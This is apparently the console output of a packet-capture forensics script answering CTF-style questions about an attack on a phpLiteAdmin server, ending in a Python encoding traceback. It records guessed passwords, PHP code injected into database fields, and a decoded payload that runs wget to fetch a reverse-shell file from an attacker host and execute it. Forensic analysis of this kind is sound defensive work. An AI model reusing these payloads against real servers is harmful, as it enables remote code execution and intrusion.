@@ -1,0 +1,121 @@
+﻿[*] Pass 2: Reading pcapng...
+
+============================================================
+Q04: �ܺ���OS
+  Server: Apache/2.2.22 (Ubuntu)
+  >>> Q04 = ubuntu
+
+============================================================
+Q05: �˿�ɨ�蹤��
+  Nmap Scripting Engine found in UA
+  >>> Q05 = nmap
+
+============================================================
+Q06: ©����⹤�߰汾��
+  ����UA:
+    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+    Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+    Wfuzz/3.1.0
+  Wfuzz/3.1.0 found - web fuzzer/vulnerability tool
+  >>> Q06 ���� = 3.1.0 (Wfuzz)
+
+============================================================
+Q07: phpliteadmin��¼��
+  phpliteadmin�������:
+  [GET] /dbadmin port=80
+  [GET] /dbadmin port=80
+  [GET] /dbadmin/ port=80
+  [GET] /dbadmin/test_db.php port=80
+  [POST] /dbadmin/test_db.php port=80
+    body: password=123456&remember=yes&login=Log+In&proc_login=true
+  [POST] /dbadmin/test_db.php port=80
+    body: password=password&remember=yes&login=Log+In&proc_login=true
+  [POST] /dbadmin/test_db.php port=80
+    body: password=admin&remember=yes&login=Log+In&proc_login=true
+  [GET] /dbadmin/test_db.php?action=row_view&table=info port=80
+  [POST] /dbadmin/test_db.php port=80
+    body: new_dbname=demo.php
+  [POST] /dbadmin/test_db.php?action=table_create port=80
+    body: tablename=test&tablefields=%3C%3Fphp+phpinfo%28%29%3F%3E&createtable=Go
+  [GET] /dbadmin/test_db.php port=80
+  [GET] /dbadmin/test_db.php port=80
+  [GET] /dbadmin/test_db.php?switchdb=%2Fusr%2Fdatabases%2Fdemo.php port=80
+  [GET] /dbadmin/test_db.php?view=sql port=80
+  [GET] /dbadmin/test_db.php?view=structure port=80
+  [GET] /dbadmin/test_db.php?view=sql port=80
+  [GET] /dbadmin/test_db.php?view=vacuum port=80
+  [GET] /dbadmin/test_db.php?view=rename port=80
+  [GET] /dbadmin/test_db.php?view=structure port=80
+  [GET] /dbadmin/test_db.php?switchdb=%2Fusr%2Fdatabases%2Fdemo.php port=80
+  >>> Q07 = /dbadmin/test_db.php
+
+============================================================
+Q08: phpliteadmin�ɹ���¼����
+  Login attempt at 1722407309.65: password=123456
+  Login attempt at 1722407313.19: password=password
+  Login attempt at 1722407316.79: password=admin
+  ��¼��Ĳ�������:
+  [GET] /dbadmin/test_db.php?action=row_view&table=info
+  [POST] /dbadmin/test_db.php?action=table_create
+    body: tablename=test&tablefields=%3C%3Fphp+phpinfo%28%29%3F%3E&createtable=Go
+  [POST] /dbadmin/test_db.php?action=table_create
+    body: tablename=test&tablefields=%3C%3Fphp+phpinfo%28%29%3F%3E&createtable=Go
+  ... 49 total actions
+
+============================================================
+Q09: phpinfoҳ���ļ���
+  [POST] /dbadmin/test_db.php
+    body: new_dbname=demo.php
+  [POST] /dbadmin/test_db.php?action=table_create
+    body: tablename=test&tablefields=%3C%3Fphp+phpinfo%28%29%3F%3E&createtable=Go
+  [POST] /dbadmin/test_db.php?action=table_create
+    body: tablename=test&tablefields=%3C%3Fphp+phpinfo%28%29%3F%3E&createtable=Go
+  [POST] /dbadmin/test_db.php?action=table_create
+    body: tablename=test&tablefields=&createtable=Go
+  [POST] /dbadmin/test_db.php?action=table_create
+    body: tablename=test&tablefields=1&createtable=Go
+  [POST] /dbadmin/test_db.php?action=table_create&confirm=1
+    body: tablename=test&rows=1&0_field=test&0_type=INTEGER&0_defaultvalue=%3C%3Fphp+phpinfo%28%29%3F%3E
+  [POST] /dbadmin/test_db.php?action=table_create
+    body: tablename=rev&tablefields=1&createtable=Go
+  [POST] /dbadmin/test_db.php?action=table_create&confirm=1
+    body: tablename=rev&rows=1&0_field=re&0_type=INTEGER&0_defaultvalue=%3C%3Fphp+system%28%22wget+192.168.75.132%3A2000%2Frev.txt+-O+%2Ftmp%2Frev.php%3B+php+%2Ftmp%2Frev.php%22%29%3B+%3F%3E%27%29
+  GET requests returning phpinfo:
+  [POST] /dbadmin/test_db.php
+    decoded body: new_dbname=demo.php
+  [POST] /dbadmin/test_db.php?action=table_create
+    decoded body: tablename=test&tablefields=<?php+phpinfo()?>&createtable=Go
+  [POST] /dbadmin/test_db.php?action=table_create
+    decoded body: tablename=test&tablefields=<?php+phpinfo()?>&createtable=Go
+  [POST] /dbadmin/test_db.php?action=table_create&confirm=1
+    decoded body: tablename=test&rows=1&0_field=test&0_type=INTEGER&0_defaultvalue=<?php+phpinfo()?>
+  [POST] /dbadmin/test_db.php?action=table_create&confirm=1
+    decoded body: tablename=rev&rows=1&0_field=re&0_type=INTEGER&0_defaultvalue=<?php+system("wget+192.168.75.132:2000/rev.txt+-O+/tmp/rev.php;+php+/tmp/rev.php");+?>')
+
+============================================================
+Q10: �ӹ��������ص�payload
+  192.168.75.131 GET /rev.txt -> 192.168.75.132:2000
+  192.168.75.131 GET /help.php -> 192.168.75.132:2000
+  192.168.75.131 GET /help.php -> 192.168.75.132:2000
+  192.168.75.131 GET /help.php -> 192.168.75.132:2000
+  >>> Q10 = rev.txt (reverse shell payload)
+  ������HTTP��������Ӧ:
+
+============================================================
+Q11: ����shell
+  Shell-like TCP streams (non-HTTP):
+
+  Port pair: 22 <-> 48598 (2 segments)
+    192.168.75.131:22 -> 192.168.75.132:48598
+python : Traceback (most recent call last):
+At line:1 char:1
++ python "F:\cloud\DD\tools\pcap_analysis_pass2.py" 2>&1 | Tee-Object - ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (Traceback (most recent call last)::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+  File "F:\cloud\DD\tools\pcap_analysis_pass2.py", line 449, in <module>
+    main()
+  File "F:\cloud\DD\tools\pcap_analysis_pass2.py", line 270, in main
+    print(f"    content: {text[:200]}")
+UnicodeEncodeError: 'gbk' codec can't encode character '\ufffd' in position 16: illegal multibyte sequence
